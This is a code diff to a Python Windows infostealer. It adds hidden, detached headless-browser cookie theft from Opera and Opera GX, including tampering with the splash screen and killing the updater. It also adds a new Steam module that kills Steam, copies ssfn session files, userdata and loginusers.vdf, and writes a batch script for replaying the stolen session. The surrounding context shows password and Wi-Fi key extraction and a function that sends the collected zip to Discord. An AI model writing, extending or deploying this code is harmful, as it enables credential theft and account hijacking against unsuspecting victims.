@@ -21,12 +21,7 @@ from pathlib import Path
 import random
 import string
 from datetime import timedelta
-
-try:
-    import psutil
-    PSUTIL_AVAILABLE = True
-except ImportError:
-    PSUTIL_AVAILABLE = False
+import psutil
 
 try:
     import wmi
@@ -245,7 +240,9 @@ def run_firefox_extraction():
 
 def kill_opera():
     subprocess.run(["taskkill", "/F", "/IM", "opera.exe"], capture_output=True)
-    time.sleep(1)
+    subprocess.run(["taskkill", "/F", "/IM", "opera_autoupdate.exe"], capture_output=True)
+    subprocess.run(["taskkill", "/F", "/IM", "opera_crashreporter.exe"], capture_output=True)
+    time.sleep(2)
 
 def get_opera_master_key(profile_path):
     local_state_path = os.path.join(profile_path, "Local State")
@@ -313,16 +310,38 @@ def extract_opera_passwords(profile_path, master_key):
 def extract_opera_cookies_cdp(browser_path, profile_path):
     kill_opera()
 
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = 0
+
+    CREATE_NO_WINDOW = 0x08000000
+    DETACHED_PROCESS = 0x00000008
+
+    env = os.environ.copy()
+    env['OPERA_HEADLESS'] = '1'
+
     proc = subprocess.Popen([
         browser_path,
         f"--user-data-dir={profile_path}",
         "--remote-debugging-port=9222",
         "--remote-allow-origins=*",
-        "--headless=new",
-        "--no-first-run"
-    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+        "--headless",
+        "--no-first-run",
+        "--no-startup-window",
+        "--disable-gpu",
+        "--disable-software-rasterizer",
+        "--disable-extensions",
+        "--disable-plugins",
+        "--disable-default-apps",
+        "--disable-sync",
+        "--disable-background-networking"
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+       stdin=subprocess.DEVNULL,
+       startupinfo=startupinfo,
+       creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
+       env=env)
 
-    time.sleep(5)
+    time.sleep(6)
 
     cookies = []
     try:
@@ -347,8 +366,34 @@ def extract_opera_cookies_cdp(browser_path, profile_path):
         proc.terminate()
         time.sleep(1)
         subprocess.run(["taskkill", "/F", "/IM", "opera.exe"], capture_output=True)
+        subprocess.run(["taskkill", "/F", "/IM", "opera_autoupdate.exe"], capture_output=True)
 
     return cookies
+
+def disable_opera_gx_splash(opera_gx_path):
+    try:
+        version_folder = os.path.dirname(opera_gx_path)
+        splash_path = os.path.join(version_folder, "opera_gx_splash.exe")
+        if os.path.exists(splash_path):
+            backup_path = splash_path + ".bak"
+            if not os.path.exists(backup_path):
+                shutil.move(splash_path, backup_path)
+            return True
+    except:
+        pass
+    return False
+
+def enable_opera_gx_splash(opera_gx_path):
+    try:
+        version_folder = os.path.dirname(opera_gx_path)
+        backup_path = os.path.join(version_folder, "opera_gx_splash.exe.bak")
+        splash_path = os.path.join(version_folder, "opera_gx_splash.exe")
+        if os.path.exists(backup_path) and not os.path.exists(splash_path):
+            shutil.move(backup_path, splash_path)
+            return True
+    except:
+        pass
+    return False
 
 def run_opera_extraction():
     opera_configs = [
@@ -360,8 +405,13 @@ def run_opera_extraction():
         if not os.path.exists(browser_path) or not os.path.exists(profile_path):
             continue
 
+        if browser_name == "Opera_GX":
+            disable_opera_gx_splash(browser_path)
+
         master_key = get_opera_master_key(profile_path)
         if not master_key:
+            if browser_name == "Opera_GX":
+                enable_opera_gx_splash(browser_path)
             continue
 
         output_dir = os.path.join(BROWSERS_DIR, browser_name)
@@ -386,6 +436,9 @@ def run_opera_extraction():
                     f.write(f"Username: {pwd['username']}\n")
                     f.write(f"Password: {pwd['password']}\n")
                     f.write("-" * 50 + "\n")
+
+        if browser_name == "Opera_GX":
+            enable_opera_gx_splash(browser_path)
 
 def get_chromium_history(history_path):
     if not os.path.exists(history_path):
@@ -1113,6 +1166,104 @@ def send_zip_to_discord(zip_path):
     except:
         return False
 
+def find_steam_path():
+    common_paths = [
+        r"C:\Program Files (x86)\Steam",
+        r"C:\Program Files\Steam",
+        os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam"),
+        os.path.expandvars(r"%PROGRAMFILES%\Steam"),
+    ]
+    
+    for path in common_paths:
+        if os.path.exists(path):
+            return path
+    return None
+
+def find_steam_userdata(steam_path):
+    if steam_path:
+        userdata_path = os.path.join(steam_path, "userdata")
+        if os.path.exists(userdata_path):
+            return userdata_path
+    return None
+
+def kill_steam():
+    for proc in psutil.process_iter(['name']):
+        if proc.info['name'] == 'Steam.exe':
+            proc.kill()
+    time.sleep(2)
+
+def extract_ssfn_files(steam_path, output_dir):
+    for file in os.listdir(steam_path):
+        if file.startswith('ssfn') and not file.endswith('.txt'):
+            src = os.path.join(steam_path, file)
+            dst = os.path.join(output_dir, file)
+            shutil.copy2(src, dst)
+
+def extract_userdata(userdata_path, output_dir):
+    if not userdata_path or not os.path.exists(userdata_path):
+        return
+    dst = os.path.join(output_dir, "userdata")
+    shutil.copytree(userdata_path, dst, dirs_exist_ok=True)
+
+def extract_local_config(steam_path, output_dir):
+    local_vdf = os.path.join(steam_path, "config", "local.vdf")
+    if os.path.exists(local_vdf):
+        shutil.copy2(local_vdf, os.path.join(output_dir, "local.vdf"))
+    
+    config_vdf = os.path.join(steam_path, "config", "config.vdf")
+    if os.path.exists(config_vdf):
+        shutil.copy2(config_vdf, os.path.join(output_dir, "config.vdf"))
+
+def extract_loginusers(steam_path, output_dir):
+    loginusers_path = os.path.join(steam_path, "config", "loginusers.vdf")
+    if os.path.exists(loginusers_path):
+        shutil.copy2(loginusers_path, os.path.join(output_dir, "loginusers.vdf"))
+
+def extract_steam_app_cache(steam_path, output_dir):
+    app_cache = os.path.join(steam_path, "appcache", "appinfo.vdf")
+    if os.path.exists(app_cache):
+        shutil.copy2(app_cache, os.path.join(output_dir, "appinfo.vdf"))
+
+def create_install_script(output_dir, steam_install_path):
+    script_content = f'''@echo off
+taskkill /F /IM Steam.exe 2>nul
+timeout /t 2 /nobreak >nul
+copy /Y "{output_dir}\\ssfn*" "{steam_install_path}\\" >nul 2>nul
+rmdir /S /Q "{steam_install_path}\\userdata" 2>nul
+xcopy /E /Y "{output_dir}\\userdata" "{steam_install_path}\\userdata\\" >nul 2>nul
+copy /Y "{output_dir}\\local.vdf" "{steam_install_path}\\config\\" >nul 2>nul
+copy /Y "{output_dir}\\config.vdf" "{steam_install_path}\\config\\" >nul 2>nul
+copy /Y "{output_dir}\\loginusers.vdf" "{steam_install_path}\\config\\" >nul 2>nul
+echo Done
+'''
+    script_path = os.path.join(output_dir, "install.bat")
+    with open(script_path, 'w') as f:
+        f.write(script_content)
+
+def extract_steam_data(steam_output_dir):
+    steam_path = find_steam_path()
+    if not steam_path:
+        return False
+    
+    userdata_path = find_steam_userdata(steam_path)
+    
+    kill_steam()
+    
+    os.makedirs(steam_output_dir, exist_ok=True)
+    
+    extract_ssfn_files(steam_path, steam_output_dir)
+    
+    if userdata_path:
+        extract_userdata(userdata_path, steam_output_dir)
+    
+    extract_local_config(steam_path, steam_output_dir)
+    extract_loginusers(steam_path, steam_output_dir)
+    extract_steam_app_cache(steam_path, steam_output_dir)
+    
+    create_install_script(steam_output_dir, steam_path)
+    
+    return True
+
 def main():
     os.makedirs(BROWSERS_DIR, exist_ok=True)
 
@@ -1170,6 +1321,9 @@ def main():
                 f.write(f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n{'='*50}\n")
 
     collect_file_inventory()
+
+    steam_output_dir = os.path.join(BASE_OUTPUT_DIR, "Steam")
+    extract_steam_data(steam_output_dir)
 
     if os.path.exists(BASE_OUTPUT_DIR):
         has_any_data = False
